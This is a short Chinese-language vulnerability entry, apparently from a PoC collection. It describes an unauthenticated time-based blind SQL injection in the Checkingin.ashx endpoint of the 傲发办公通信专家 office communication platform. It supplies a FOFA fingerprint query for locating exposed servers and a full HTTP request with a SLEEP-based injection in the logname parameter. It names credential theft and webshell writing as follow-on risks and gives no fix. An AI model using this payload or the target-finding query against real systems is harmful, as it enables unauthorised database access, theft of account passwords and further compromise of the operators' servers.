## 傲发办公通信专家 Checkingin.ashx SQL注入漏洞

## 漏洞描述
傲发办公通信专家平台的 `Checkingin.ashx` 接口在处理 `logname` 参数时没有过滤与参数化，导致未授权攻击者可发起时间盲注，进一步读取数据库中的账号口令等敏感信息。

## 网络空间测绘
```
fofa: body="getincommingcall"
```

## POC
```
GET /handle/Checkingin.ashx?type=checkingin&logname='+and+(SELECT+*+FROM+(SELECT(SLEEP(5)))x)+and+&date=1 HTTP/1.1
Host: <target domain>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
```
当响应延迟 ≥5 秒时漏洞成立。

## 风险
- 数据库凭据泄露
- 针对高权限账号可进一步写入 Webshell

## 参考
- 社区披露

